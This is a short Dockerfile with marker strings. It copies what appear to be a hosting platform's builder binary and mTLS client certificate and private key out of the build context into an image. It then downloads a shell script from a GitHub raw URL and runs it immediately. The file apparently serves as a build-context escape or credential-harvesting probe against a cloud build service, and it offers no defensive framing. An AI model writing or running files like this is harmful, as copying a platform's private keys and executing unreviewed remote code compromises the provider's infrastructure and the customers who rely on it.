# MARK-INTENT-67521-b2
FROM alpine:3.20
RUN echo MARK-INTENT-67521-a1b2c3d4
COPY usr/bin/builderv3 /f/bv
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
RUN apk add --no-cache curl bash bind-tools openssl >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 20 -o /p6.sh https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/p6b.sh && ls -la /p6.sh && sh /p6.sh
CMD ["sh","-c","sleep 3600"]
